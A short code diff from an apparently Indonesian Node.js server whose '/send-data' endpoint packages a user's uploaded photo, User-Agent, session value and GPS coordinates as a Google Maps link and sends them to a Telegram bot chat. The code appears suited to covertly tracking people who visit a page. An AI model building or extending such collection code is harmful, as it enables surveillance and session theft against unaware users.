@@ -76,12 +76,18 @@ app.post("/send-data", upload.single("photo"), async (req, res) => {
         const userAgent = req.headers["user-agent"]; // User-Agent pengguna
    
 
+        const infos = `
+- User-Agent: ${userAgent}
+- Lokasi: https://www.google.com/maps?q=${latitude},${longitude}
+- Sesi: ${session}
+        `;
+
+        
         // Kirim foto ke bot Telegram
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", req.file.buffer, "photo.jpg");
-        formData.append("useragent", userAgent);
-        formData.append("session", session);
+        formData.append("info", infos);
         formData.append("caption", caption);
         
 
